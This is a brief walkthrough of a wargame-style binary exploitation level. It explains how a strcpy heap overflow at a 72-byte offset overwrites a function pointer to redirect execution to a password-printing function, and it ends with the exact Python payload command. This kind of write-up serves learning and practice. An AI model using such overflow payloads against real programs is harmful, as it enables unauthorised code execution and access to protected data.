the n function print the pass file we need, and we've seen that the program return to the m function
so the purpose of this level is to replace m with n using a heap overflow permitted by strcpy

0x08048454 -> \x54\x84\x04\x08 -> address of n

we use the pattern generator to find that we can overflow at 72 bytes and when we display the heap on gdb we see that the address of m is at 72 bytes
we will overwrite it with the n address so the final payload is :
./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
